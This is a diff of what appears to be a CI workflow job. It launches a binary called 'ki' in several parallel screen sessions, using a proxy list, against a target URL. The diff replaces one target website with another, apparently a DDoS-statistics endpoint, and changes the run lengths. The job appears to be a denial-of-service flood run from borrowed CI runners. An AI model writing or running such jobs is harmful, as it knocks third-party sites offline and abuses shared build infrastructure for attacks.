@@ -34,12 +34,12 @@ jobs:
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
           chmod +x ki
-          export TARGET="https://iemgroup.online/angry"
-          screen -dms ve ./ki $TARGET 700 1 1 
-          screen -dms ve ./ki $TARGET 700 1 1 
-          screen -dms ve ./ki $TARGET 700 1 1
-          ./ki $TARGET 300 1 1 
-          sleep 300
+          export TARGET="https://c3.dstatbot.win/vunzby8K"
+          screen -dms ve ./ki $TARGET 200 1 1 
+          screen -dms ve ./ki $TARGET 200 1 1 
+          screen -dms ve ./ki $TARGET 200 1 1
+          ./ki $TARGET 200 1 1 
+          
           
           
         env:
